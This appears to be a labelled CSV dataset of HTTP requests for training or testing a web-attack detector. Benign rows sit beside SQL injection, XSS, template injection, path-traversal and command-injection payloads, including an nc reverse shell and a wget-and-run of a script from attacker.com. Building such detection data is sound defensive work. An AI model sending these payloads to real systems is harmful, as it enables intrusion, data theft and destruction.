request_normalized,label
"GET /exec?cmd=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=| net user&submit=1",cmdi
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=| whoami&submit=1",cmdi
"GET /admin/run?input=; rm -rf /tmp/* HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=1 && dir&submit=1",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

input=<input type=text value='' onfocus=alert(1) autofocus>&submit=1",xss
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=<iframe src='javascript:alert(1)'></iframe>&submit=1",xss
"GET /search?q=1'; DROP TABLE users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /comment?text=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /news/article/breaking-news HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=${7*7}&submit=1",rce
"GET /api/process?data={{lipsum.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /feedback?msg=<IMG SRC=JaVaScRiPt:alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=<a href='javascript:alert(1)'>click me</a>&submit=1",xss
"GET /template?expr={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

input={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&submit=1",rce
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

input={{7*7}}&submit=1",rce
"GET /image?src=../../../../etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

input=' OR 'x'='x&submit=1",sqli
"GET /api/items?name=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /admin/run?input=`id` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /feedback?msg=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=#{7*7}&submit=1",rce
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=system('id')&submit=1",rce
"GET /api/items?name=admin'-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /calc?formula=<% Runtime.getRuntime().exec('id') %> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=1 UNION SELECT null,password FROM users--&submit=1",sqli
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=bob_jones&email=admin@test.org&message=Hello World",benign
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=alice_miller&email=user@example.com&message=Hello World",benign
"GET /comment?text=<body onload=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=/etc/passwd&submit=1",path_traversal
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input=' AND 1=2 UNION SELECT table_name FROM information_schema.tables--&submit=1",sqli
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=../////etc/////passwd&submit=1",path_traversal
"GET /api/products?category=watch&page=36&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /api/items?name=1 UNION SELECT null,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=<body onload=alert('XSS')>&submit=1",xss
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"GET /api/v2/orders?status=pending&user_id=2854 HTTP/1.1
Host: api.example.com
Authorization: Bearer 07cb8921a1b960e6b49082be60421192",benign
"GET /api/items?name=1' AND SLEEP(5)-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=admin'--&submit=1",sqli
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

input=../../../etc/passwd&submit=1",path_traversal
"GET /search?q=<script>alert('xss')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

input=eval(compile('import os; os.system(""id"")', 'string', 'exec'))&submit=1",rce
"GET /user?id=' AND 1=2 UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

input=<IMG SRC=JaVaScRiPt:alert('XSS')>&submit=1",xss
"GET /api/ping?host=; rm -rf /tmp/* HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

input=eval(compile('import os; os.system(""id"")', 'string', 'exec'))&submit=1",rce
"GET /eval?code=${T(java.lang.Runtime).getRuntime().exec('id')} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /api/v2/orders?status=pending&user_id=8276 HTTP/1.1
Host: api.example.com
Authorization: Bearer f40b40ec2d2ad848ae2328f5fb3406e8",benign
"GET /api/items?name=1 UNION SELECT user(),database(),version()-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /exec?cmd=1 && dir HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /image?src=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=<svg onload=alert(1)>&submit=1",xss
"GET /search?q=shoes&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=bf84c273639b3ead",benign
"GET /download?file=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /eval?code=[[${7*7}]] HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /admin/run?input=| net user HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

input=$(id)&submit=1",cmdi
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=1 && dir&submit=1",cmdi
"GET /feedback?msg=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /image?src=../../boot.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=<svg onload=alert(1)>&submit=1",xss
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"GET /download?file=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=system('id')&submit=1",rce
"GET /search?q=' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

input=../etc/passwd.jpg&submit=1",path_traversal
"GET /download?file=../../../proc/self/environ HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /profile?bio=<input type=text value='' onfocus=alert(1) autofocus> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /images/img_6055.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /download?file=../../../proc/self/environ HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=../../../etc/passwd&submit=1",path_traversal
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=' UNION ALL SELECT NULL,NULL,NULL--&submit=1",sqli
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /api/items?name=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /view?doc=....//....//etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=; rm -rf /tmp/*&submit=1",cmdi
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

input={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}&submit=1",rce
"GET /api/v2/orders?status=pending&user_id=9681 HTTP/1.1
Host: api.example.com
Authorization: Bearer c8ab059629826a396302fa7b4565c1d5",benign
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

input=1' UNION SELECT null,username,password FROM users--&submit=1",sqli
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=../../../../etc/shadow&submit=1",path_traversal
"GET /download?file=/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=....//....//etc/passwd&submit=1",path_traversal
"GET /search?q=clothing&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=1f2e2939d2f5055d",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=<iframe src='javascript:alert(1)'></iframe>&submit=1",xss
"GET /admin/run?input=; cat /etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=& ipconfig&submit=1",cmdi
"GET /api/ping?host=&& cat /etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=../../../../etc/shadow&submit=1",path_traversal
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=' OR 1=1--&submit=1",sqli
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=x' AND email IS NULL; --&submit=1",sqli
"GET /api/items?name=1' AND SLEEP(5)-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=<script>alert('XSS')</script>&submit=1",xss
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=javascript:alert('XSS')&submit=1",xss
"GET /exec?cmd=| id HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=1' OR 1=1--&submit=1",sqli
"GET /api/items?name=1 UNION SELECT null,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /download?file=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"GET /profile?bio=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /profile?bio=""><script>alert(document.cookie)</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/process?data=[[${7*7}]] HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

input=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh&submit=1",cmdi
"GET /search?q=1'; INSERT INTO users VALUES('hacker','hacked')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input={{config.__class__.__init__.__globals__['os'].popen('id').read()}}&submit=1",rce
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=system('id')&submit=1",rce
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

input=; cat /etc/shadow&submit=1",cmdi
"GET /comment?text=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=;assert(system('id'));&submit=1",rce
"GET /image?src=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

input=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh&submit=1",cmdi
"GET /api/products?category=camera&page=19&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /view?doc=../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=';alert(String.fromCharCode(88,83,83))//&submit=1",xss
"GET /eval?code=<?php passthru('cat /etc/passwd'); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /search?q=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /search?q=1 AND 1=1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"GET /products?filter=1 AND 1=1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /products?filter=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<img src=x onerror=alert('XSS')>&submit=1",xss
"GET /feedback?msg=xss""><img src=/ onerror=alert(2)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /user?id=1 AND 1=1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/v2/orders?status=pending&user_id=2457 HTTP/1.1
Host: api.example.com
Authorization: Bearer f0aadf0bd7adf17d8833ad671cb91fe5",benign
"GET /api/products?category=laptop&page=14&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=';alert(String.fromCharCode(88,83,83))//&submit=1",xss
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

input=1' AND SLEEP(5)--&submit=1",sqli
"GET /admin/run?input=; systeminfo HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=eval(base64_decode('c3lzdGVtKCdpZCcp'));&submit=1",rce
"GET /api/ping?host=| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/ping?host=1 && dir HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=' OR 1=1 LIMIT 1--&submit=1",sqli
"GET /comment?text=javascript:alert('XSS') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /tools/lookup?domain=`id` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

input=' OR ''='&submit=1",sqli
"GET /search?q=' OR 'x'='x HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/v2/orders?status=pending&user_id=1223 HTTP/1.1
Host: api.example.com
Authorization: Bearer be33632a3a3c050adb6a2b1eb2d3552b",benign
"GET /news/article/getting-started HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=....//....//etc/passwd&submit=1",path_traversal
"GET /exec?cmd=$(cat /etc/passwd) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=*{7*7}&submit=1",rce
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=../../boot.ini&submit=1",path_traversal
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

input=; rm -rf /tmp/*&submit=1",cmdi
"GET /image?src=../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /download?file=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

input={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}&submit=1",rce
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""bob_jones"",""password"":""957cf033""}",benign
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input='-alert(1)-'&submit=1",xss
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=alice_miller&email=info@site.net&message=Hello World",benign
"GET /exec?cmd=& echo test > /tmp/pwned HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /admin/run?input=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"GET /assets?path=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /view?doc=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /user?id=1' AND SLEEP(5)-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
